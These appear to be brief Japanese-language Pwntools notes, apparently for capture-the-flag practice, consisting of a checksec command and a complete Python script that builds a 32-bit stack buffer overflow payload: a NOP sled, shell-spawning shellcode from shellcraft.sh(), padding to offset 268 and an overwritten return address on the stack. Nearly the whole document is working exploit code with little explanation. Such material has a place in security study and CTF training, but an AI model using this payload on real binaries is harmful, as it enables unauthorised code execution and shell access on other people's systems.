# Pwntools
# 解き方の例
```bash
$ checksec FIEL
```
# スタック バッファフロー
```bash
#! /usr/bin/env python3
from pwn import *
import sys

# << stack >>
# [000] nopsled
#       <-- 0xffffd010 + alpha
# [...] shellcode
# [...] padding
# [268] eip

#alpha = int(sys.argv[1])
alpha = 128
context(arch = 'i386', os = 'linux')
#print(hexdump(asm('nop')))
#print(shellcraft.sh())
#print(hexdump(asm(shellcraft.sh())))
#exit(1)
offset = 268
nopsled = asm('nop') * 60
shellcode = asm(shellcraft.sh())
padding = b'A' * (offset-len(nopsled)-len(shellcode))
eip = p32(0xffffd010+alpha) # gdb の外だと少しアドレスがずれるので試行錯誤で調整
junk = b'C' * (300-len(nopsled)-len(shellcode)-len(padding)-len(eip))
sys.stdout.buffer.write(nopsled + shellcode + padding + eip + junk)
```
